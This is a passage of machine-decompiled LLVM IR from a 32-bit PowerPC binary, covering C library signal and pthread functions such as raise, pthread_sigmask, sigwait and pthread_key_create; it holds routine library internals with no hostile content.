  uselistorder i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), { 0, 8, 9, 12, 7, 13, 10, 11, 14, 1, 2, 3, 4, 15, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000911c, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10009144 = call i32 @__GI_pthread_self()
  store i32 268472656, i32* @lr, align 4
  %v2_1000914c = call i32 @pthread_kill(i32 %v0_10009144, i32 %arg1)
  store i32 %v2_1000914c, i32* @r29, align 4
  %v3_10009150 = icmp eq i32 %v2_1000914c, 0
  br i1 %v3_10009150, label %dec_label_pc_10009168, label %dec_label_pc_1000915c

dec_label_pc_1000915c:                            ; preds = %entry
  %v0_1000915c = call i32 @__errno_location()
  %v0_10009160 = load i32, i32* @r29, align 4
  %v2_10009160 = inttoptr i32 %v0_1000915c to i32*
  store i32 %v0_10009160, i32* %v2_10009160, align 4
  br label %dec_label_pc_10009168

dec_label_pc_10009168:                            ; preds = %entry, %dec_label_pc_1000915c
  %v0_10009178 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_1000915c ]
  ret i32 %v0_10009178

; uselistorder directives
  uselistorder label %dec_label_pc_10009168, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-152 = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  %v3_10009190 = icmp eq i32 %arg2, 0
  store i32 %arg3, i32* %r29.global-to-local, align 4
  br i1 %v3_10009190, label %dec_label_pc_10009218, label %dec_label_pc_1000919c

dec_label_pc_1000919c:                            ; preds = %entry
  %v2_1000919c = ptrtoint i32* %stack_var_-152 to i32
  store i32 128, i32* @r5, align 4
  store i32 %v2_1000919c, i32* @r3, align 4
  store i32 268472748, i32* @lr, align 4
  %v0_100091a8 = call i32 @memcpy()
  %v0_100091ac = load i32, i32* %r30.global-to-local, align 4
  %v3_100091ac = icmp eq i32 %v0_100091ac, 1
  br i1 %v3_100091ac, label %dec_label_pc_100091fc, label %dec_label_pc_100091b4

dec_label_pc_100091b4:                            ; preds = %dec_label_pc_1000919c
  %v3_100091b4 = icmp eq i32 %v0_100091ac, 2
  br i1 %v3_100091b4, label %dec_label_pc_100091c8, label %dec_label_pc_100091bc

dec_label_pc_100091bc:                            ; preds = %dec_label_pc_100091b4
  %v3_100091bc = icmp eq i32 %v0_100091ac, 0
  br i1 %v3_100091bc, label %dec_label_pc_100091d8, label %dec_label_pc_10009214

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_100091b4
  store i32 %v2_1000919c, i32* @r3, align 4
  %v3_100091d0 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 268472792, i32* @lr, align 4
  %v2_100091d4 = call i32 @__GI_sigaddset(i32 %v2_1000919c, i32 %v3_100091d0)
  br label %dec_label_pc_100091d8

dec_label_pc_100091d8:                            ; preds = %dec_label_pc_100091bc, %dec_label_pc_100091c8
  store i32 %v2_1000919c, i32* @r3, align 4
  store i32 268472808, i32* @lr, align 4
  %v1_100091e4 = call i32 @__GI_sigdelset(i32 %v2_1000919c)
  %v3_100091ec = load i32, i32* @global_var_1002ef5c.230, align 4
  %tmp6 = icmp slt i32 %v3_100091ec, 1
  br i1 %tmp6, label %dec_label_pc_10009214, label %dec_label_pc_10009204

dec_label_pc_100091fc:                            ; preds = %dec_label_pc_1000919c
  br label %dec_label_pc_10009204

dec_label_pc_10009204:                            ; preds = %dec_label_pc_100091d8, %dec_label_pc_100091fc
  store i32 %v2_1000919c, i32* @r3, align 4
  store i32 268472844, i32* @lr, align 4
  %v1_10009208 = call i32 @__GI_sigdelset(i32 %v2_1000919c)
  br label %dec_label_pc_10009218

dec_label_pc_10009214:                            ; preds = %dec_label_pc_100091bc, %dec_label_pc_100091d8
  br label %dec_label_pc_10009218

dec_label_pc_10009218:                            ; preds = %entry, %dec_label_pc_10009204, %dec_label_pc_10009214
  %v0_1000921c = phi i32 [ 0, %entry ], [ %v2_1000919c, %dec_label_pc_10009204 ], [ %v2_1000919c, %dec_label_pc_10009214 ]
  %v0_10009218 = load i32, i32* %r30.global-to-local, align 4
  %v0_10009220 = load i32, i32* %r29.global-to-local, align 4
  store i32 268472872, i32* @lr, align 4
  %v3_10009224 = call i32 @__GI_sigprocmask(i32 %v0_10009218, i32 %v0_1000921c, i32 %v0_10009220)
  %v3_10009228 = icmp eq i32 %v3_10009224, -1
  br i1 %v3_10009228, label %dec_label_pc_10009234, label %dec_label_pc_1000923c

dec_label_pc_10009234:                            ; preds = %dec_label_pc_10009218
  %v0_10009234 = call i32 @__errno_location()
  %v1_10009238 = inttoptr i32 %v0_10009234 to i32*
  %v2_10009238 = load i32, i32* %v1_10009238, align 4
  br label %dec_label_pc_1000923c

dec_label_pc_1000923c:                            ; preds = %dec_label_pc_10009218, %dec_label_pc_10009234
  %v0_1000924c = phi i32 [ 0, %dec_label_pc_10009218 ], [ %v2_10009238, %dec_label_pc_10009234 ]
  ret i32 %v0_1000924c

; uselistorder directives
  uselistorder i32 %v2_1000919c, { 0, 1, 7, 6, 3, 2, 5, 4, 8 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000923c, { 1, 0 }
  uselistorder label %dec_label_pc_10009218, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009214, { 1, 0 }
  uselistorder label %dec_label_pc_10009204, { 1, 0 }
  uselistorder label %dec_label_pc_100091d8, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_10009250 = load i32, i32* @lr, align 4
  store i32 %v0_10009250, i32* %r0.global-to-local, align 4
  %v4_10009254 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009254, i32* %stack_var_-32, align 4
  %v5_10009254 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10009258 = call i32 @__asm_mfcr()
  %v1_1000925c = mul i32 %v0_10009258, 4
  store i32 %v1_1000925c, i32* %r11.global-to-local, align 4
  %v0_10009264 = load i32, i32* @r2, align 4
  store i32 %v0_10009264, i32* %r31.global-to-local, align 4
  %v0_10009268 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009270 = add i32 %v0_10009264, 88
  %v2_10009270 = inttoptr i32 %v1_10009270 to i8*
  %v3_10009270 = load i8, i8* %v2_10009270, align 1
  %v4_10009270 = zext i8 %v3_10009270 to i32
  store i32 %v4_10009270, i32* %r0.global-to-local, align 4
  %v3_10009274 = icmp eq i8 %v3_10009270, 0
  br i1 %v3_10009274, label %dec_label_pc_1000928c, label %dec_label_pc_1000927c

dec_label_pc_1000927c:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10009280 = add i32 %v0_10009264, 32
  %v3_10009280 = inttoptr i32 %v2_10009280 to i32*
  store i32 %v0_10009258, i32* %v3_10009280, align 4
  %v0_10009284 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009284 = trunc i32 %v0_10009284 to i8
  %v2_10009284 = load i32, i32* @r2, align 4
  %v3_10009284 = add i32 %v2_10009284, 88
  %v4_10009284 = inttoptr i32 %v3_10009284 to i8*
  store i8 %v1_10009284, i8* %v4_10009284, align 1
  br label %dec_label_pc_100092b8

dec_label_pc_1000928c:                            ; preds = %entry
  %v1_1000928c = add i32 %v0_10009264, 84
  %v2_1000928c = inttoptr i32 %v1_1000928c to i32*
  %v3_1000928c = load i32, i32* %v2_1000928c, align 4
  store i32 %v3_1000928c, i32* %r30.global-to-local, align 4
  %v3_10009290 = icmp eq i32 %v3_1000928c, 0
  store i1 %v3_10009290, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10009290, label %dec_label_pc_10009298, label %dec_label_pc_1000929c

dec_label_pc_10009298:                            ; preds = %dec_label_pc_1000928c
  store i32 %v5_10009254, i32* %v2_1000928c, align 4
  %v0_100092a4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000929c

dec_label_pc_1000929c:                            ; preds = %dec_label_pc_1000928c, %dec_label_pc_10009298
  %v0_100092a4 = phi i32 [ %v1_1000925c, %dec_label_pc_1000928c ], [ %v0_100092a4.pre, %dec_label_pc_10009298 ]
  %v2_100092a4 = add i32 %v0_100092a4, ptrtoint (i32* @global_var_1002f528.337 to i32)
  %v3_100092a4 = inttoptr i32 %v2_100092a4 to i32*
  %v4_100092a4 = load i32, i32* %v3_100092a4, align 4
  store i32 %v4_100092a4, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_100092a4)
  %v0_100092b0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100092b0, label %dec_label_pc_100092b4, label %dec_label_pc_100092b8

dec_label_pc_100092b4:                            ; preds = %dec_label_pc_1000929c
  %v0_100092b4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100092b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100092b4 = add i32 %v1_100092b4, 84
  %v3_100092b4 = inttoptr i32 %v2_100092b4 to i32*
  store i32 %v0_100092b4, i32* %v3_100092b4, align 4
  br label %dec_label_pc_100092b8

dec_label_pc_100092b8:                            ; preds = %dec_label_pc_1000929c, %dec_label_pc_1000927c, %dec_label_pc_100092b4
  store i32 %v0_10009268, i32* %r0.global-to-local, align 4
  %v1_100092c8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009258)
  ret i32 %v0_10009258

; uselistorder directives
  uselistorder i32 %v1_1000925c, { 1, 0 }
  uselistorder i32 %v0_10009258, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_100092b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000929c, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-772 = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %v0_100092d8 = load i32, i32* @lr, align 4
  store i32 %v0_100092d8, i32* %r0.global-to-local, align 4
  %v2_100092e0 = ptrtoint i32* %stack_var_-900 to i32
  store i32 %arg1, i32* @r31, align 4
  %v0_100092f4 = load i32, i32* @r2, align 4
  store i32 268473084, i32* @lr, align 4
  %v1_100092f8 = call i32 @sigfillset(i32 %v2_100092e0)
  store i32 %v2_100092e0, i32* @r3, align 4
  store i32 1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10009310.339 to i32), i32* @lr, align 4
  %v1_1000930c = call i32 @__GI_sigdelset(i32 %v2_100092e0)
  %v0_100093a41 = load i32, i32* @r29, align 4
  %v0_100093ac6 = load i32, i32* @r31, align 4
  store i32 %v0_100093ac6, i32* @r3, align 4
  %tmp22 = icmp slt i32 %v0_100093a41, 66
  br i1 %tmp22, label %dec_label_pc_10009314.lr.ph, label %dec_label_pc_100093b4

dec_label_pc_10009314.lr.ph:                      ; preds = %entry
  %v2_1000936c = ptrtoint i32* %stack_var_-768 to i32
  br label %dec_label_pc_10009314

dec_label_pc_10009314:                            ; preds = %dec_label_pc_10009314.lr.ph, %dec_label_pc_100093a0
  %v0_100093ac10 = phi i32 [ %v0_100093ac6, %dec_label_pc_10009314.lr.ph ], [ %v0_100093ac, %dec_label_pc_100093a0 ]
  %v0_100093a89 = phi i32 [ %v0_100093a41, %dec_label_pc_10009314.lr.ph ], [ %v1_100093a0, %dec_label_pc_100093a0 ]
  store i32 268473112, i32* @lr, align 4
  %v2_10009314 = call i32 @sigismember(i32 %v0_100093ac10, i32 %v0_100093a89)
  %v3_10009318 = icmp eq i32 %v2_10009314, 0
  br i1 %v3_10009318, label %dec_label_pc_100093a0, label %dec_label_pc_10009320

dec_label_pc_10009320:                            ; preds = %dec_label_pc_10009314
  %v3_10009324 = load i32, i32* @global_var_1002ef54.217, align 4
  store i32 %v3_10009324, i32* %r0.global-to-local, align 4
  %v0_10009328 = load i32, i32* @r29, align 4
  %v4_10009328 = icmp eq i32 %v0_10009328, %v3_10009324
  br i1 %v4_10009328, label %dec_label_pc_100093a0, label %dec_label_pc_10009330

dec_label_pc_10009330:                            ; preds = %dec_label_pc_10009320
  %v3_10009334 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 %v3_10009334, i32* %r0.global-to-local, align 4
  %v4_10009338 = icmp eq i32 %v0_10009328, %v3_10009334
  br i1 %v4_10009338, label %dec_label_pc_100093a0, label %dec_label_pc_10009340

dec_label_pc_10009340:                            ; preds = %dec_label_pc_10009330
  %v3_10009348 = load i32, i32* @global_var_1002ef5c.230, align 4
  store i32 %v3_10009348, i32* %r0.global-to-local, align 4
  store i32 %v2_100092e0, i32* @r3, align 4
  %v4_10009350 = icmp eq i32 %v0_10009328, %v3_10009348
  br i1 %v4_10009350, label %dec_label_pc_100093a0, label %dec_label_pc_10009358

dec_label_pc_10009358:                            ; preds = %dec_label_pc_10009340
  store i32 268473180, i32* @lr, align 4
  %v1_10009358 = call i32 @__GI_sigdelset(i32 %v2_100092e0)
  %v0_10009360 = load i32, i32* @r29, align 4
  %v1_10009360 = mul i32 %v0_10009360, 4
  store i32 %v1_10009360, i32* %r0.global-to-local, align 4
  %v2_10009368 = add i32 %v1_10009360, ptrtoint (i32* @global_var_1002f528.337 to i32)
  %v3_10009368 = inttoptr i32 %v2_10009368 to i32*
  %v4_10009368 = load i32, i32* %v3_10009368, align 4
  store i32 %v4_10009368, i32* %r0.global-to-local, align 4
  %v2_10009370 = icmp ugt i32 %v4_10009368, 1
  br i1 %v2_10009370, label %dec_label_pc_100093a0, label %dec_label_pc_10009378

dec_label_pc_10009378:                            ; preds = %dec_label_pc_10009358
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -28856), i32* %stack_var_-772, align 4
  store i32 268473224, i32* @lr, align 4
  %v1_10009384 = call i32 @sigemptyset(i32 %v2_1000936c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10009390 = load i32, i32* @r29, align 4
  store i32 268473248, i32* @lr, align 4
  %v4_1000939c = call i32 @__GI_sigaction(i32 %v0_10009390, i32* nonnull %stack_var_-772, i32 0)
  br label %dec_label_pc_100093a0

dec_label_pc_100093a0:                            ; preds = %dec_label_pc_10009358, %dec_label_pc_10009340, %dec_label_pc_10009330, %dec_label_pc_10009320, %dec_label_pc_10009314, %dec_label_pc_10009378
  %v0_100093a0 = load i32, i32* @r29, align 4
  %v1_100093a0 = add i32 %v0_100093a0, 1
  store i32 %v1_100093a0, i32* @r29, align 4
  %v0_100093ac = load i32, i32* @r31, align 4
  store i32 %v0_100093ac, i32* @r3, align 4
  %tmp23 = icmp slt i32 %v1_100093a0, 66
  br i1 %tmp23, label %dec_label_pc_10009314, label %dec_label_pc_100093b4

dec_label_pc_100093b4:                            ; preds = %dec_label_pc_100093a0, %entry
  %v2_100093b4 = ptrtoint i32* %stack_var_-624 to i32
  store i32 1, i32* @r4, align 4
  store i32 268473280, i32* @lr, align 4
  %v3_100093bc = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_100093c0 = icmp eq i32 %v3_100093bc, 0
  br i1 %v3_100093c0, label %dec_label_pc_100093c8, label %dec_label_pc_100093b4.dec_label_pc_10009410_crit_edge

dec_label_pc_100093b4.dec_label_pc_10009410_crit_edge: ; preds = %dec_label_pc_100093b4
  %.pre = add i32 %v0_100092f4, 40
  %.pre11 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10009410

dec_label_pc_100093c8:                            ; preds = %dec_label_pc_100093b4
  store i32 %v2_100093b4, i32* %r0.global-to-local, align 4
  %v2_100093d0 = add i32 %v0_100092f4, 40
  %v3_100093d0 = inttoptr i32 %v2_100093d0 to i32*
  store i32 %v2_100093b4, i32* %v3_100093d0, align 4
  %v1_100093d8 = add i32 %v0_100092f4, 66
  %v2_100093d8 = inttoptr i32 %v1_100093d8 to i8*
  %v3_100093d8 = load i8, i8* %v2_100093d8, align 1
  %v4_100093d8 = zext i8 %v3_100093d8 to i32
  store i32 %v4_100093d8, i32* %r0.global-to-local, align 4
  %v3_100093dc = icmp eq i8 %v3_100093d8, 0
  br i1 %v3_100093dc, label %dec_label_pc_100093f4, label %dec_label_pc_100093e4

dec_label_pc_100093e4:                            ; preds = %dec_label_pc_100093c8
  %v1_100093e8 = add i32 %v0_100092f4, 64
  %v2_100093e8 = inttoptr i32 %v1_100093e8 to i8*
  %v3_100093e8 = load i8, i8* %v2_100093e8, align 1
  %v4_100093e8 = zext i8 %v3_100093e8 to i32
  store i32 %v4_100093e8, i32* %r0.global-to-local, align 4
  %v3_100093ec = icmp eq i8 %v3_100093e8, 0
  br i1 %v3_100093ec, label %dec_label_pc_10009410, label %dec_label_pc_100093f4

dec_label_pc_100093f4:                            ; preds = %dec_label_pc_100093e4, %dec_label_pc_100093c8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100093fc = add i32 %v0_100092f4, 32
  %v3_100093fc = inttoptr i32 %v2_100093fc to i32*
  store i32 0, i32* %v3_100093fc, align 4
  %v0_10009408 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009408 = trunc i32 %v0_10009408 to i8
  %v3_10009408 = add i32 %v0_100092f4, 88
  %v4_10009408 = inttoptr i32 %v3_10009408 to i8*
  store i8 %v1_10009408, i8* %v4_10009408, align 1
  store i32 268473360, i32* @lr, align 4
  %v1_1000940c = call i32 @__libc_sigsuspend(i32 %v2_100092e0)
  br label %dec_label_pc_10009410

dec_label_pc_10009410:                            ; preds = %dec_label_pc_100093b4.dec_label_pc_10009410_crit_edge, %dec_label_pc_100093e4, %dec_label_pc_100093f4
  %v3_10009418.pre-phi = phi i32* [ %.pre11, %dec_label_pc_100093b4.dec_label_pc_10009410_crit_edge ], [ %v3_100093d0, %dec_label_pc_100093e4 ], [ %v3_100093d0, %dec_label_pc_100093f4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10009418.pre-phi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009420.340 to i32), i32* @lr, align 4
  %v1_1000941c = call i32 @pthread_testcancel(i32 %v0_100092f4)
  %v1_10009428 = add i32 %v0_100092f4, 32
  %v2_10009428 = inttoptr i32 %v1_10009428 to i32*
  %v3_10009428 = load i32, i32* %v2_10009428, align 4
  store i32 %v3_10009428, i32* %arg2, align 4
  store i32 %v0_100092d8, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100093ac, { 1, 0 }
  uselistorder i32 %v1_100093a0, { 0, 2, 1 }
  uselistorder i32 %v1_10009360, { 1, 0 }
  uselistorder i32 %v0_100093a41, { 1, 0 }
  uselistorder i32 %v0_100092f4, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %v2_100092e0, { 2, 0, 3, 5, 4, 1 }
  uselistorder i32 (i32)* @__libc_sigsuspend, { 1, 0 }
  uselistorder i32 (i32)* @sigemptyset, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f528.337 to i32), { 0, 1, 2, 5, 3, 6, 4 }
  uselistorder i32 66, { 3, 0, 1, 4, 5, 12, 10, 6, 7, 13, 8, 9, 11, 2 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder label %dec_label_pc_10009410, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100093a0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10009314, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %v2_10009448 = icmp ugt i32 %arg1, 1023
  store i32 22, i32* @r10, align 4
  store i32 %arg2, i32* @r27, align 4
  %v0_1000946c = load i32, i32* @r2, align 4
  store i32 %v0_1000946c, i32* @r28, align 4
  br i1 %v2_10009448, label %dec_label_pc_100094d8, label %dec_label_pc_10009474

dec_label_pc_10009474:                            ; preds = %entry
  %v1_10009468 = mul i32 %arg1, 8
  %v1_10009474 = udiv i32 %arg1, 32
  store i32 %v1_10009474, i32* @r29, align 4
  %v2_1000948c = add i32 %v1_10009468, ptrtoint (i32* @global_var_1002f62c.341 to i32)
  %v3_1000948c = inttoptr i32 %v2_1000948c to i32*
  %v4_1000948c = load i32, i32* %v3_1000948c, align 4
  %v3_10009490 = icmp eq i32 %v4_1000948c, 0
  br i1 %v3_10009490, label %dec_label_pc_100094d8, label %dec_label_pc_10009498

dec_label_pc_10009498:                            ; preds = %dec_label_pc_10009474
  %v1_10009478 = mul nuw nsw i32 %v1_10009474, 4
  %v2_1000947c = add i32 %v0_1000946c, %v1_10009478
  %v1_10009498 = add i32 %v2_1000947c, 236
  %v2_10009498 = inttoptr i32 %v1_10009498 to i32*
  %v3_10009498 = load i32, i32* %v2_10009498, align 4
  %v3_100094a4 = icmp eq i32 %v3_10009498, 0
  br i1 %v3_100094a4, label %dec_label_pc_100094ac, label %dec_label_pc_100094c0

dec_label_pc_100094ac:                            ; preds = %dec_label_pc_10009498
  store i32 ptrtoint ([3 x i8]* @global_var_100094b0.342 to i32), i32* @lr, align 4
  %v2_100094ac = call i32 @calloc(i32 32, i32 4)
  store i32 12, i32* %r10.global-to-local, align 4
  %v3_100094b4 = icmp eq i32 %v2_100094ac, 0
  br i1 %v3_100094b4, label %dec_label_pc_100094d8, label %dec_label_pc_100094bc

dec_label_pc_100094bc:                            ; preds = %dec_label_pc_100094ac
  %v1_100094bc = load i32, i32* @r30, align 4
  %v2_100094bc = add i32 %v1_100094bc, 12
  %v3_100094bc = inttoptr i32 %v2_100094bc to i32*
  store i32 %v2_100094ac, i32* %v3_100094bc, align 4
  %v0_100094c0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100094c0

dec_label_pc_100094c0:                            ; preds = %dec_label_pc_10009498, %dec_label_pc_100094bc
  %v0_100094c0 = phi i32 [ %v1_10009474, %dec_label_pc_10009498 ], [ %v0_100094c0.pre, %dec_label_pc_100094bc ]
  %v1_100094c0 = mul i32 %v0_100094c0, 4
  %v1_100094c4 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_100094c8 = load i32, i32* @r28, align 4
  %v2_100094c8 = add i32 %v1_100094c8, %v1_100094c0
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_100094d0 = add i32 %v2_100094c8, 236
  %v2_100094d0 = inttoptr i32 %v1_100094d0 to i32*
  %v3_100094d0 = load i32, i32* %v2_100094d0, align 4
  %v0_100094d4 = load i32, i32* @r27, align 4
  %v3_100094d4 = add i32 %v3_100094d0, %v1_100094c4
  %v4_100094d4 = inttoptr i32 %v3_100094d4 to i32*
  store i32 %v0_100094d4, i32* %v4_100094d4, align 4
  %v0_100094dc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100094d8

dec_label_pc_100094d8:                            ; preds = %dec_label_pc_100094ac, %dec_label_pc_10009474, %entry, %dec_label_pc_100094c0
  %v0_100094dc = phi i32 [ 12, %dec_label_pc_100094ac ], [ 22, %dec_label_pc_10009474 ], [ 22, %entry ], [ %v0_100094dc.pre, %dec_label_pc_100094c0 ]
  ret i32 %v0_100094dc

; uselistorder directives
  uselistorder i32 %v1_10009474, { 2, 0, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100094d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100094c0, { 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009524.lr.ph:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1003162c.343 to i32), i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10009514.344 to i32), i32* @lr, align 4
  %v1_10009510 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003162c.343 to i32))
  store i32 %v1_10009510, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_1002f62c.341 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1002f62c.341 to i32), i32* @r10, align 4
  br label %dec_label_pc_10009524

dec_label_pc_10009524:                            ; preds = %dec_label_pc_10009524.lr.ph, %dec_label_pc_10009554
  %v0_10009568 = phi i32 [ 1024, %dec_label_pc_10009524.lr.ph ], [ %v1_10009568, %dec_label_pc_10009554 ]
  %v0_10009554 = phi i32 [ 0, %dec_label_pc_10009524.lr.ph ], [ %v1_10009554, %dec_label_pc_10009554 ]
  %v1_10009538 = phi i32 [ 0, %dec_label_pc_10009524.lr.ph ], [ %v1_1000955c, %dec_label_pc_10009554 ]
  %v2_10009524 = add i32 %v1_10009538, ptrtoint (i32* @global_var_1002f62c.341 to i32)
  %v3_10009524 = inttoptr i32 %v2_10009524 to i32*
  %v4_10009524 = load i32, i32* %v3_10009524, align 4
  %v3_10009528 = icmp eq i32 %v4_10009524, 0
  br i1 %v3_10009528, label %dec_label_pc_10009530, label %dec_label_pc_10009554

dec_label_pc_10009530:                            ; preds = %dec_label_pc_10009524
  store i32 1, i32* %v3_10009524, align 4
  store i32 ptrtoint (i32* @global_var_1003162c.343 to i32), i32* @r3, align 4
  %v0_10009540 = load i32, i32* @r30, align 4
  %v1_10009540 = load i32, i32* @r10, align 4
  %v2_10009540 = add i32 %v1_10009540, 4
  %v3_10009540 = inttoptr i32 %v2_10009540 to i32*
  store i32 %v0_10009540, i32* %v3_10009540, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009548.346 to i32), i32* @lr, align 4
  %v0_10009544 = call i32 @pthread_mutex_unlock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1000954c = load i32, i32* @r31, align 4
  %v1_1000954c = load i32, i32* @r29, align 4
  %v2_1000954c = inttoptr i32 %v1_1000954c to i32*
  store i32 %v0_1000954c, i32* %v2_1000954c, align 4
  %v0_1000958c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000957c

dec_label_pc_10009554:                            ; preds = %dec_label_pc_10009524
  %v1_10009554 = add nuw nsw i32 %v0_10009554, 1
  store i32 %v1_10009554, i32* @r31, align 4
  %v1_1000955c = mul i32 %v1_10009554, 8
  store i32 %v1_1000955c, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_1002f62c.341 to i32), i32* @r9, align 4
  %v2_10009564 = add i32 %v1_1000955c, ptrtoint (i32* @global_var_1002f62c.341 to i32)
  store i32 %v2_10009564, i32* @r10, align 4
  %v1_10009568 = add nsw i32 %v0_10009568, -1
  %v2_10009568 = icmp eq i32 %v1_10009568, 0
  br i1 %v2_10009568, label %dec_label_pc_1000956c, label %dec_label_pc_10009524

dec_label_pc_1000956c:                            ; preds = %dec_label_pc_10009554
  store i32 ptrtoint (i32* @global_var_1003162c.343 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009578.347 to i32), i32* @lr, align 4
  %v0_10009574 = call i32 @pthread_mutex_unlock()
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000957c

dec_label_pc_1000957c:                            ; preds = %dec_label_pc_10009530, %dec_label_pc_1000956c
  %v0_1000958c = phi i32 [ %v0_1000958c.pre, %dec_label_pc_10009530 ], [ 11, %dec_label_pc_1000956c ]
  ret i32 %v0_1000958c

; uselistorder directives
  uselistorder i32 %v1_10009568, { 1, 0 }
  uselistorder i32 %v1_1000955c, { 1, 0, 2 }
  uselistorder i32 %v1_10009554, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000957c, { 1, 0 }
  uselistorder label %dec_label_pc_10009524, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10009594 = load i32, i32* @lr, align 4
  store i32 %v0_10009594, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1003162c.343 to i32), i32* @r30, align 4
  %v0_100095b0 = load i32, i32* @r2, align 4
  store i32 %v0_100095b0, i32* @r29, align 4
  store i32 268473784, i32* @lr, align 4
  %v1_100095b4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003162c.343 to i32))
  %v2_100095b8 = icmp ugt i32 %arg1, 1023
  br i1 %v2_100095b8, label %dec_label_pc_100095dc, label %dec_label_pc_100095c0

dec_label_pc_100095c0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v1_100095c4 = mul i32 %arg1, 8
